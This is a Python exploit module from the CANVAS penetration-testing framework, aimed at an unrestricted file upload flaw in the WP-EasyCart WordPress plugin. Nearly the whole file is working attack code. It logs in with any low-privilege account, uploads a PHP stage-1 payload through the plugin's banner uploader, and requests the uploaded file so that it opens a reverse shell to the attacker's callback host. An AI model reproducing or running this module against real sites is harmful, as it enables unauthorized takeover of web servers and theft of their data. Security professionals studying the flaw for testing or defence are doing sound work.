#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2014
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import socket
import time
import re
import urllib2
import cookielib
import urllib
import string
import random
import pprint

if "." not in sys.path:
    sys.path.append(".")

import timeoutsocket
import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *
from canvasexploit import canvasexploit
from tcpexploit import tcpexploit
from contextlib import contextmanager
from phplistener import get_php_stage1

NAME                            = "WP-EasyCart Shell Upload"
DESCRIPTION                     = "Post Authentication Shell upload vulnerability in the WP-EasyCart WordPress Plugin"
VERSION                         = "1.0"

DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "http://www.wpeasycart.com/"
DOCUMENTATION["Date public"]   = "1/9/2015"
DOCUMENTATION["CERT Advisory"] = "None"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = "http://packetstormsecurity.com/files/129875/WordPress-Shopping-Cart-3.0.4-Unrestricted-File-Upload.html"
DOCUMENTATION["CVE Name"]      = "CWE-434"
DOCUMENTATION["CVE Url"]       = "https://cwe.mitre.org/data/definitions/434.html"
DOCUMENTATION["Changelog"]     = "https://wordpress.org/plugins/wp-easycart/changelog/"
DOCUMENTATION["Notes"]         = """

Vulnerable versions are <= 3.0.4

We assume that wp-content/plugins/wp-easycart/products/banners/ is writable which
is not the case when the plugin is installed. If the plugin is in USE this directory
should be  writable for most configurations.

This module works with any account level, all the way down to subscriber.

The advisory comes with a CVE number but it is unclear if that number has actually
been assigned to this vulnerability or not.
"""

PROPERTY            = {}
PROPERTY["TYPE"]    = "Web Exploits"
PROPERTY["SITE"]    =  "Remote"
PROPERTY["ARCH"]    = [["Linux"]]
PROPERTY["VERSION"] = []

targets = {}


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name       = NAME
        self.debug      = False
        self.ssl        = None
        self.url        = None
        self.username   = None # This is Post-Auth
        self.password   = None
        self.hostname   = None # In the case of vhosts
        self.charSet    = string.lowercase + string.digits
        self.shellFile  = ''.join(random.sample(self.charSet*8, 8))
        self.nonce      = None # We obtain a nonce that allows us to upload files

    def getargs(self):
        self.getarg("ssl")
        if self.ssl != "True" or self.ssl != "true":
            self.ssl = False

        self.getarg("url")
        if "/index.php" in self.url:
            self.url.replace("/index.php", "/")
        if self.url[-1] != "/":
             self.url = self.url + "/"

        self.getarg("username")
        self.getarg("password")
        self.getarg("hostname")

        self.node = self.argsDict["passednodes"][0]

        return

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def usage(self):
        """
        We need a bit more information than just the target's IP
        """
        print "=" * 10
        print "Post-auth shell upload vulnerability in the WPTouch plugin for Wordpress 3.x <= 3.4.2"
        print "-O url:<path to wordpress>" # ex: wordpress/
        print "-O ssl:<True/False>"
        print "-O username:<username>"
        print "-O password:<password>"
        print "-O hostname:<hostname> # If no DNS record is present for the host, use the IP"
        print "=" * 10

    def testUrl(self):
        """
        Let's make sure the supplied host is reachable and looks like a wordpress page
        """
        # Make the request
        try:
            if self.ssl:
                testUrl = "https://" + self.hostname + self.url + "wp-login.php"
            else:
                testUrl = "http://" + self.hostname + self.url + "wp-login.php"
            self.log("[+] Checking that %s is the WordPress login page" % testUrl)
            (testResponse, testCode) = spkproxy.urlopen(testUrl,
                                       verb = "GET",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
            resData = testResponse.read()
        except IOError as e:
            self.log_error("Failed to connect to provided URL (%s)" % testUrl)
            self.log_error(e.strerror)

        # Test the results
        if testCode == -1:
            self.log_error("Unable to contact the server at %s" % testUrl)
        elif testCode != 200:
            self.log_info("Received an HTTP STATUS CODE of %d" % testCode)
            self.log_info("Visit %s and ensure it is the WordPress login page" % testCode)
        elif re.search("Lost your password", resData, re.IGNORECASE):
            self.log_info("Found the WordPress login page, proceeding")
            self.url = testUrl.replace("wp-login.php", "")
            return True
        else:
            self.log_error("Didn't find the expected WordPress login page, aborting")
            self.log_info("[ii] Visit %s and ensure it is the WordPress login page" % testUrl)

        return False

    def parseCookies(self, res, exheaders):
        """
        We have to handle cookies ourselves with spkproxy
        """
        cookie = ""
        for line in res.read().splitlines():
            if "Set-Cookie" in line:
                temp = line.split(" ")[1]
                cookie += temp + " "
        exheaders.append(("Cookie", cookie))

        return exheaders

    def logInToWordpress(self):
        """
        This is post-auth so we'll need to log in
        """
        exheaders = [("Content-Type", "application/x-www-form-urlencoded"), ("Connection", "keep-alive")]
        authString = "log=" + self.username + "&pwd=" + self.password + "&wp-submit=Log+in"
        (res, code) = spkproxy.urlopen(self.url + "wp-login.php",
                                       extraheaders = exheaders,
                                       data = authString,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
        if code == 302:
            exheaders = self.parseCookies(res, exheaders)
            return exheaders
        else:
            self.log_error("Login failed")
            return False

    def uploadShell(self, exheaders):
        """
        Upload a shell through our authenticated session
        The plugin doesn't restrict file upload types, vulnerability #2
        """
        # Generate the PHP callback
        host        = self.callback.ip
        port        = self.callback.port
        badChars    = ""

        # This is the code that'll be inserted on the remote machine
        # if you want a custom shell do it here
        ret = "<?php " + get_php_stage1(badChars, host, port) + " ?>"

        # Create our payload to POST
        payload = ""
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"datemd5\"\r\n"
        payload += "\r\n1\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Filedata\"; filename=\"%s.php\"\r\n" % self.shellFile
        payload += "Content-Type: application/octet-stream\r\n\r\n"
        payload += "%s\r\n" % ret
        payload += "--576a5sdf6--\r\n"

        # Update connection parameters
        url = self.url + "wp-content/plugins/wp-easycart/inc/amfphp/administration/banneruploaderscript.php"
        exheaders.remove(("Content-Type", "application/x-www-form-urlencoded"))
        exheaders.append(("Content-Type", "multipart/form-data; boundary=576a5sdf6"))

        # Make the POST
        (res, code) = spkproxy.urlopen(url,
                                       extraheaders = exheaders,
                                       data = payload,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = False,
                                       return_response_code = True)
        # Check for failure
        if code == 200:
            self.log_info("Shell upload may have been successful")
        else:
            self.log_info("Received unexpected status code of %d when attempting upload, proceeding anyway" % code)
        return True

    def trigger(self):
        """
        Visit our callback
        """
        url = self.url + "wp-content/plugins/wp-easycart/products/banners/%s_1.php" % self.shellFile
        self.nlog("Trying to visit %s" % url)

        (trigResp, trigCode) = spkproxy.urlopen(url, verb = "GET", hostname = self.hostname, entireresponse = True, return_response_code = True)
        if trigCode != 200:
           self.log_info("Received HTTP STATUS CODE of %d" % trigCode)
           self.log_error("The wp-content/plugins/wp-easycart/products/banners/ directory may not be writable by the web service")
        else:
           self.log_info("Upload succeeded")
           return True

        return False

    def run(self):
        self.getargs()

        if self.testUrl():
            exheaders = self.logInToWordpress()
            if (exheaders and self.uploadShell(exheaders)):
                if self.trigger():
                    return True
        return False


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
